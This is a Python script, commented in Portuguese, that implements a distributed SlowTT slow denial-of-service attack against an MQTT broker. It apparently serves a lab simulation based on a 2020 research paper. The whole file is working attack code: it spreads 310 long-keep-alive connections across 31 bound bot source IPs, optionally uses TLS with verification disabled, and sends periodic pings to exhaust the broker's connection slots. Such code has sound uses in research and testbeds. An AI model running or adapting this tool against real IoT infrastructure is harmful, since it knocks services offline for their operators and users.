#!/usr/bin/env python3
"""
Ataque SlowTT Distribuído (Multi-Botnet Simulation)
Baseado em: Vaccari et al. (2020) - "SlowTT: A Slow Denial of Service Against IoT Networks"
Bot diversos
"""

import argparse
import socket
import ssl
import sys
import threading
import time

BROKER_HOST = "10.0.2.10"
BROKER_PORT = 1883
NUM_CONNECTIONS = 310  # 10 conexões por IP para 31 IPs
KEEP_ALIVE = 65535
WAIT_TIMEOUT = 50

active_connections = []
lock = threading.Lock()
running = True


def build_mqtt_connect_packet(client_id, keep_alive):
  protocol_name = b"MQTT"
  protocol_level = 4  # v3.1.1
  connect_flags = 0x02  # Clean Session = 1

  client_id_bytes = client_id.encode("utf-8")
  payload = len(client_id_bytes).to_bytes(2, byteorder="big") + client_id_bytes

  variable_header = (
      len(protocol_name).to_bytes(2, byteorder="big")
      + protocol_name
      + protocol_level.to_bytes(1, byteorder="big")
      + connect_flags.to_bytes(1, byteorder="big")
      + keep_alive.to_bytes(2, byteorder="big")
  )

  variable_and_payload = variable_header + payload
  fixed_header = b"\x10" + len(variable_and_payload).to_bytes(
      1, byteorder="big"
  )
  return fixed_header + variable_and_payload


def build_mqtt_pingreq_packet():
  return b"\xc0\x00"


def attack_worker(thread_id, host, port, keep_alive, wt, use_tls, src_ip):
  global running
  client_id = f"bot_{src_ip.replace('.', '_')}_{thread_id}_{int(time.time())}"

  try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Associa a conexão TCP a um IP específico do pool de bots
    if src_ip:
      sock.bind((src_ip, 0))
    sock.settimeout(8.0)

    if use_tls:
      context = ssl.create_default_context()
      context.check_hostname = False
      context.verify_mode = ssl.CERT_NONE
      sock = context.wrap_socket(sock, server_hostname=host)

    sock.connect((host, port))

    connect_packet = build_mqtt_connect_packet(client_id, keep_alive)
    sock.sendall(connect_packet)

    connack = sock.recv(4)
    if len(connack) < 4 or connack[0] != 0x20 or connack[3] != 0x00:
      sock.close()
      return

    with lock:
      active_connections.append(sock)

    sock.settimeout(None)
    ping_packet = build_mqtt_pingreq_packet()

    while running:
      time.sleep(wt)
      try:
        sock.sendall(ping_packet)
        sock.settimeout(4.0)
        resp = sock.recv(2)
        sock.settimeout(None)
      except Exception:
        break

  except Exception:
    pass
  finally:
    try:
      sock.close()
    except Exception:
      pass


def main():
  global running
  parser = argparse.ArgumentParser(
      description="Ataque SlowTT Distribuído (Multi-Bot)"
  )
  parser.add_argument("--host", default=BROKER_HOST)
  parser.add_argument("--port", type=int, default=BROKER_PORT)
  parser.add_argument("-c", "--connections", type=int, default=NUM_CONNECTIONS)
  parser.add_argument("-k", "--keepalive", type=int, default=KEEP_ALIVE)
  parser.add_argument("-wt", "--waittimeout", type=int, default=WAIT_TIMEOUT)
  parser.add_argument("--tls", action="store_true")
  args = parser.parse_args()

  # Gera a lista de 31 IPs de origem (10.0.1.20 a 10.0.1.50)
  ip_pool = [f"10.0.1.{i}" for i in range(20, 51)]

  print("=" * 60)
  print("        INICIANDO ATAQUE SLOWTT DISTRIBUÍDO (MULTI-BOT)      ")
  print("=" * 60)
  print(f" Alvo           : {args.host}:{args.port}")
  print(f" Total Conexões : {args.connections}")
  print(f" Botnet Pool    : {len(ip_pool)} IPs ({ip_pool[0]} -> {ip_pool[-1]})")
  print(f" Conexões / IP  : {args.connections // len(ip_pool)}")
  print("=" * 60)

  threads = []
  for i in range(args.connections):
    if not running:
      break
    src_ip = ip_pool[i % len(ip_pool)]
    t = threading.Thread(
        target=attack_worker,
        args=(
            i,
            args.host,
            args.port,
            args.keepalive,
            args.waittimeout,
            args.tls,
            src_ip,
        ),
    )
    t.daemon = True
    threads.append(t)
    t.start()
    time.sleep(0.01)

  try:
    while True:
      time.sleep(1)
      with lock:
        print(
            f"\r[STATUS Multi-Bot] Conexões ativas retidas no Broker:"
            f" {len(active_connections)}/{args.connections}",
            end="",
            flush=True,
        )
  except KeyboardInterrupt:
    running = False
    with lock:
      for s in active_connections:
        try:
          s.close()
        except Exception:
          pass
    sys.exit(0)


if __name__ == "__main__":
  main()
